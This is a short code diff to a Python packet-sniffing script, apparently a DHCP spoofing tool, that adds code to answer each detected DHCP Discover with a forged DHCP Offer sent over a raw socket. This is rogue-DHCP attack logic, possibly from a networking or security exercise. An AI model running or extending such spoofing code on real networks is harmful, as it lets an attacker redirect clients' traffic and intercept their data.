@@ -1,7 +1,7 @@
 #!/usr/bin/python3 -tt
 import argparse
 from socket import socket, htons, SOCK_RAW, AF_PACKET
-from spoofing.packet import parse, IP_PROTOCOL
+from spoofing.packet import parse, IP_PROTOCOL, DhcpOffer
 
 class log:
 
@@ -38,13 +38,18 @@ def spoof_init():
 
     BUFFER_SIZE = 1518
     while 1:
-        packet = parse(s.recv(BUFFER_SIZE))
+        recv = s.recv(BUFFER_SIZE)
+        packet = parse(recv)
         try:
             if packet.ip.udp.dhcp:
                 print ('Detected a dhcp packet:')
                 if packet.ip.udp.dhcp.type == 1:
                     if packet.ip.udp.dhcp.dhcpOptions.dhcpType == 1:
                         print ('    >is a Discover')
+                        #print (recv)
+                        pacote = DhcpOffer(packet.ip.udp.dhcp.transaction_id, packet.origin_mac, packet.ip.udp.dhcp.client_ip).getPacket()
+                        print(pacote)
+                        s.send(pacote)
                     elif packet.ip.udp.dhcp.dhcpOptions.dhcpType == 3:
                         print ('    >is a Request')
 
